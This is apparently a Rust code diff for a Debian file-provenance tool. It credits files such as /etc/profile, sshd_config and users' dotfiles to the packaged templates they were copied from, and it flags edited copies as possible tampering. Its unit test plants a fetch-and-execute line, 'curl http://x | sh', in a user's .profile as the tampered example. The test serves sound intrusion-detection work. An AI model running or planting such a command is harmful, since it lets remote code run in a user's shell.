@@ -31,6 +31,36 @@ const CAP: usize = 256 * 1024;
 const NSSWITCH: &str = "etc/nsswitch.conf";
 const NSSWITCH_TEMPLATE: &str = "usr/share/libc-bin/nsswitch.conf";
 
+/// Files a package's postinst installs by copying a template it ships, so
+/// that dpkg owns the template and never the file: base-files' /etc/profile
+/// and root's dotfiles, openssh-server's sshd_config from Debian 12 on,
+/// sysvinit-core's inittab. Byte for byte the template, the file is what the
+/// package wrote; edited, it is the operator's or an intruder's, and shows.
+const COPIES: [(&str, &str); 5] = [
+    ("etc/profile", "usr/share/base-files/profile"),
+    ("root/.bashrc", "usr/share/base-files/dot.bashrc"),
+    ("root/.profile", "usr/share/base-files/dot.profile"),
+    ("etc/ssh/sshd_config", "usr/share/openssh/sshd_config"),
+    ("etc/inittab", "usr/share/sysvinit/inittab"),
+];
+
+/// adduser copies /etc/skel into every new home; bash ships the skeleton as
+/// conffiles, so an untouched copy in a home is bash's own text.
+const SKEL: [&str; 3] = [".bashrc", ".profile", ".bash_logout"];
+
+/// The packaged template a path is a copy of, if it is one of the known
+/// copies: a home's dotfile is /etc/skel's, root's is base-files'.
+fn template_of(path: &Path) -> Option<PathBuf> {
+    if let Some((_, template)) = COPIES.iter().find(|(p, _)| Path::new(p) == path) {
+        return Some(PathBuf::from(template));
+    }
+    let name = path.file_name()?.to_str()?;
+    if SKEL.contains(&name) && path.components().count() >= 3 {
+        return Some(Path::new("etc/skel").join(name));
+    }
+    None
+}
+
 const PAM_TYPES: [&str; 5] = ["auth", "account", "password", "session", "session-noninteractive"];
 const PAM_TEMPLATES: &str = "usr/share/pam";
 const PAM_PROFILES: &str = "usr/share/pam-configs";
@@ -62,6 +92,8 @@ pub fn inputs(root: &Root, wanted: &std::collections::BTreeSet<PathBuf>) -> Vec<
             if let Some((dir, _)) = authselect_config(root) {
                 out.push(dir.join(name));
             }
+        } else if let Some(template) = template_of(path) {
+            out.push(template);
         }
     }
     out
@@ -103,6 +135,10 @@ pub fn classify(root: &Root, wanted: &std::collections::BTreeSet<PathBuf>, answe
             };
             let expected = rendered.map(|r| [AUTHSELECT_PREAMBLE.as_bytes(), &r].concat());
             (expected, inputs, "authselect".to_string())
+        } else if let Some(template) = template_of(path) {
+            let Some(Provenance::Packaged { package, .. }) = answers.get(&template) else { continue };
+            let by = format!("{package}, identical to /{}", template.display());
+            (read(root, &template), vec![template], by)
         } else {
             continue;
         };
@@ -661,6 +697,63 @@ mod tests {
                 (p.file_name().unwrap().to_string_lossy().into_owned(), root, files)
             })
             .collect()
+    }
+
+    #[test]
+    fn a_file_identical_to_the_packaged_template_it_was_copied_from_is_reproduced() {
+        let dir = std::env::temp_dir().join(format!("unbidden-copies-{}", std::process::id()));
+        let _ = std::fs::remove_dir_all(&dir);
+        for d in ["etc/skel", "usr/share/base-files", "root", "home/alice", "var/lib/dpkg/info"] {
+            std::fs::create_dir_all(dir.join(d)).unwrap();
+        }
+        let md5 = |b: &[u8]| {
+            use md5::Digest as _;
+            crate::entry::hex(&md5::Md5::digest(b))
+        };
+        let profile = b"# /etc/profile: system-wide .profile file\nif [ \"$(id -u)\" -eq 0 ]; then PATH=/usr/sbin:/usr/bin; fi\n";
+        let bashrc = b"# ~/.bashrc\ncase $- in *i*) ;; *) return;; esac\n";
+        let skel_profile = b"# ~/.profile\n";
+        std::fs::write(dir.join("usr/share/base-files/profile"), profile).unwrap();
+        std::fs::write(dir.join("usr/share/base-files/dot.bashrc"), bashrc).unwrap();
+        std::fs::write(dir.join("etc/skel/.bashrc"), bashrc).unwrap();
+        std::fs::write(dir.join("etc/skel/.profile"), skel_profile).unwrap();
+        std::fs::write(dir.join("etc/profile"), profile).unwrap();
+        std::fs::write(dir.join("root/.bashrc"), bashrc).unwrap();
+        std::fs::write(dir.join("home/alice/.bashrc"), bashrc).unwrap();
+        std::fs::write(dir.join("home/alice/.profile"), b"curl http://x | sh\n").unwrap();
+        let status = format!(
+            "Package: base-files\nStatus: install ok installed\nVersion: 13\n\nPackage: bash\nStatus: install ok installed\nVersion: 5.2\nConffiles:\n /etc/skel/.bashrc {}\n /etc/skel/.profile {}\n\n",
+            md5(bashrc),
+            md5(skel_profile)
+        );
+        std::fs::write(dir.join("var/lib/dpkg/status"), status).unwrap();
+        std::fs::write(dir.join("var/lib/dpkg/info/base-files.list"), "/usr/share/base-files/profile\n/usr/share/base-files/dot.bashrc\n").unwrap();
+        std::fs::write(
+            dir.join("var/lib/dpkg/info/base-files.md5sums"),
+            format!("{}  usr/share/base-files/profile\n{}  usr/share/base-files/dot.bashrc\n", md5(profile), md5(bashrc)),
+        )
+        .unwrap();
+        std::fs::write(dir.join("var/lib/dpkg/info/bash.list"), "/etc/skel/.bashrc\n/etc/skel/.profile\n").unwrap();
+
+        let root = Root::at(&dir).unwrap();
+        let wanted: std::collections::BTreeSet<PathBuf> =
+            ["etc/profile", "root/.bashrc", "home/alice/.bashrc", "home/alice/.profile"].iter().map(PathBuf::from).collect();
+        let answers = super::super::resolve(&root, &wanted).answers;
+        let by = |p: &str| match &answers[Path::new(p)] {
+            Provenance::Reproduced { by } => by.clone(),
+            other => format!("{other:?}"),
+        };
+        assert_eq!(by("etc/profile"), "base-files, identical to /usr/share/base-files/profile");
+        assert_eq!(by("root/.bashrc"), "base-files, identical to /usr/share/base-files/dot.bashrc");
+        assert_eq!(by("home/alice/.bashrc"), "bash, identical to /etc/skel/.bashrc");
+        assert_eq!(answers[Path::new("home/alice/.profile")], Provenance::Unpackaged, "an edited copy is the operator's or an intruder's");
+
+        // The template itself edited: nothing it matches is vouched for.
+        std::fs::write(dir.join("usr/share/base-files/profile"), "# tampered\n").unwrap();
+        std::fs::write(dir.join("etc/profile"), "# tampered\n").unwrap();
+        let answers = super::super::resolve(&root, &wanted).answers;
+        assert_eq!(answers[Path::new("etc/profile")], Provenance::Unpackaged);
+        std::fs::remove_dir_all(&dir).unwrap();
     }
 
     #[test]
